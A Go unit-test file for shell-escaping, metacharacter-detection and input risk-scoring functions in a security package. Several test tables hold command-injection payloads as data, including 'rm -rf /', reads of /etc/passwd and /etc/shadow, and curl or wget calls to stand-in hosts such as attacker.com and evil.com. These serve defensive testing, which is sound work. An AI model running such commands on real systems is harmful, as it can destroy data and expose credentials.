package security

import (
	"strings"
	"testing"
)

func TestShellEscape(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"empty string", "", "''"},
		{"simple word", "hello", "'hello'"},
		{"with spaces", "hello world", "'hello world'"},
		{"with single quote", "it's", "'it'\\''s'"},
		{"with double quotes", `say "hi"`, `'say "hi"'`},
		{"with dollar sign", "cost $100", "'cost $100'"},
		{"command substitution", "$(whoami)", "'$(whoami)'"},
		{"backtick substitution", "`id`", "'`id`'"},
		{"semicolon", "a; rm -rf /", "'a; rm -rf /'"},
		{"pipe", "a | b", "'a | b'"},
		{"ampersand", "a & b", "'a & b'"},
		{"redirect", "a > /etc/passwd", "'a > /etc/passwd'"},
		{"backslash", `a\b`, `'a\b'`},
		{"exclamation", "hello!", "'hello!'"},
		{"glob star", "*.txt", "'*.txt'"},
		{"question mark", "file?.txt", "'file?.txt'"},
		{"tilde", "~root", "'~root'"},
		{"hash", "# comment", "'# comment'"},
		{"multiple single quotes", "it's a 'test'", "'it'\\''s a '\\''test'\\'''"},
		{"unicode emoji", "fix: bug \U0001F41B", "'fix: bug \U0001F41B'"},
		{"unicode CJK", "テスト", "'テスト'"},
		{"newline", "line1\nline2", "'line1\nline2'"},
		{"tab", "col1\tcol2", "'col1\tcol2'"},
		{"only single quote", "'", "''\\'''"},
		{"parentheses", "fn()", "'fn()'"},
		{"braces", "{a,b}", "'{a,b}'"},
		{"brackets", "arr[0]", "'arr[0]'"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ShellEscape(tt.input)
			if got != tt.want {
				t.Errorf("ShellEscape(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestShellEscape_InjectionVectors(t *testing.T) {
	// All outputs must be wrapped in single quotes, neutralizing the payloads
	payloads := []string{
		"$(whoami)",
		"`id`",
		"; rm -rf /",
		"| cat /etc/passwd",
		"&& curl attacker.com",
		`"$(curl attacker.com)"`,
		"'; DROP TABLE users; --",
		"$(cat /etc/shadow)",
		"`wget http://evil.com/shell.sh`",
		"test\n$(whoami)",
		"${IFS}cat${IFS}/etc/passwd",
		"$((1+1))",
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			escaped := ShellEscape(payload)
			// Must start and end with single quote
			if !strings.HasPrefix(escaped, "'") || !strings.HasSuffix(escaped, "'") {
				t.Errorf("ShellEscape(%q) = %q — not properly quoted", payload, escaped)
			}
			// Must not contain unescaped single quotes (every internal ' must be '\'' pattern)
			inner := escaped[1 : len(escaped)-1]
			inner = strings.ReplaceAll(inner, "'\\''", "")
			if strings.Contains(inner, "'") {
				t.Errorf("ShellEscape(%q) = %q — contains unescaped single quotes", payload, escaped)
			}
		})
	}
}

func TestShellEscape_RealWorldPayloads(t *testing.T) {
	tests := []struct {
		name  string
		input string
	}{
		// OWASP command injection examples
		{"OWASP semicolon", "; ls -la"},
		{"OWASP pipe", "| ls -la"},
		{"OWASP double ampersand", "&& ls -la"},
		{"OWASP double pipe", "|| ls -la"},
		{"OWASP command sub dollar", "$(cat /etc/passwd)"},
		{"OWASP command sub backtick", "`cat /etc/passwd`"},
		{"OWASP redirect append", ">> /etc/crontab"},
		{"OWASP heredoc break", "<<EOF\nmalicious\nEOF"},

		// GitHub issue edge cases
		{"issue title with emoji", "fix: handle edge case 🐛 in parser"},
		{"issue title with unicode", "feat: 日本語サポート追加"},
		{"issue title with nested quotes", `fix: handle "it's broken" error`},
		{"issue body with code block", "```\nfunc main() { fmt.Println(\"hello\") }\n```"},
		{"issue with backtick in title", "fix: `getValue()` returns nil"},
		{"issue with dollar sign", "fix: handle $VARIABLE expansion"},
		{"issue with angle brackets", "feat: add <T> generic support"},
		{"issue with hash references", "fix #123: resolve race condition"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			escaped := ShellEscape(tt.input)

			// Must be properly single-quoted
			if !strings.HasPrefix(escaped, "'") || !strings.HasSuffix(escaped, "'") {
				t.Errorf("ShellEscape(%q) not properly quoted: %q", tt.input, escaped)
			}

			// Round-trip: unescaping must recover original
			unescaped := escaped[1 : len(escaped)-1]
			unescaped = strings.ReplaceAll(unescaped, "'\\''", "'")
			if unescaped != tt.input {
				t.Errorf("Round-trip failed for %q: got %q", tt.input, unescaped)
			}
		})
	}
}

func TestContainsShellMetachars_InjectionPayloads(t *testing.T) {
	// All of these must be detected as containing shell metacharacters
	payloads := []struct {
		name  string
		input string
	}{
		{"command substitution dollar", "$(whoami)"},
		{"command substitution backtick", "`id`"},
		{"semicolon chain", "; rm -rf /"},
		{"pipe to cat", "| cat /etc/passwd"},
		{"background exec", "& curl attacker.com"},
		{"redirect output", "> /etc/crontab"},
		{"redirect input", "< /dev/zero"},
		{"glob expansion", "rm *.log"},
		{"subshell", "(echo pwned)"},
		{"brace expansion", "{cat,/etc/passwd}"},
		{"variable expansion", "$HOME/.ssh/id_rsa"},
		{"escape character", "test\\ninjection"},
		{"history expansion", "!previous_command"},
		{"tilde expansion", "~root/.bashrc"},
		{"hash comment", "legitimate # ; rm -rf /"},
	}

	for _, tt := range payloads {
		t.Run(tt.name, func(t *testing.T) {
			if !containsShellMetachars(tt.input) {
				t.Errorf("containsShellMetachars(%q) = false, want true", tt.input)
			}
		})
	}
}

func TestContainsShellMetachars(t *testing.T) {
	tests := []struct {
		input string
		want  bool
	}{
		{"hello world", false},
		{"simple-input", false},
		{"path/to/file.txt", false},
		{"hello | world", true},
		{"cmd & bg", true},
		{"$(whoami)", true},
		{"`id`", true},
		{"a;b", true},
		{"foo > bar", true},
		{"foo < bar", true},
		{"rm -rf *", true},
		{"echo $HOME", true},
		{"it's fine", false},           // apostrophe is not in the metachar set
		{"test\\escape", true},         // backslash
		{"hello!world", true},          // bang
		{"array[0]", true},             // brackets
		{"glob?.txt", true},            // question mark
		{"~root", true},                // tilde
		{"comment # here", true},       // hash
		{"safe_input-123.txt", false},  // typical filename
		{"", false},                    // empty string
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := containsShellMetachars(tt.input)
			if got != tt.want {
				t.Errorf("containsShellMetachars(%q) = %v, want %v", tt.input, got, tt.want)
			}
		})
	}
}

func TestCalculateRiskScore_ShellMetachars(t *testing.T) {
	config := DefaultSecurityConfig()
	logger := NewSecurityLogger(false)
	sanitizer := NewInputSanitizer(*config, logger)

	tests := []struct {
		name     string
		input    string
		minScore int
	}{
		{
			name:     "clean input scores zero",
			input:    "Review the auth module",
			minScore: 0,
		},
		{
			name:     "pipe character adds risk",
			input:    "it's a test | with pipes",
			minScore: 15,
		},
		{
			name:     "ampersand adds risk",
			input:    "run this & that",
			minScore: 15,
		},
		{
			name:     "command substitution adds risk",
			input:    "hello $(whoami)",
			minScore: 15,
		},
		{
			name:     "shell metachars plus suspicious word",
			input:    "get the password | send",
			minScore: 20, // 15 (metachars) + 5 (suspicious word)
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			score := sanitizer.calculateRiskScore(tt.input, nil)
			if score < tt.minScore {
				t.Errorf("calculateRiskScore(%q) = %d, want >= %d", tt.input, score, tt.minScore)
			}
		})
	}
}

func TestSanitizeInput_ShellMetacharsLogged(t *testing.T) {
	config := DefaultSecurityConfig()
	logger := NewSecurityLogger(false)
	sanitizer := NewInputSanitizer(*config, logger)

	record, sanitized, err := sanitizer.SanitizeInput("hello | world & foo", "task_description")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Input should pass through unchanged (we detect, not strip)
	if sanitized != "hello | world & foo" {
		t.Errorf("input was modified: got %q", sanitized)
	}

	// Risk score should reflect shell metacharacters
	if record.RiskScore < 15 {
		t.Errorf("risk score %d too low for input with shell metachars", record.RiskScore)
	}
}
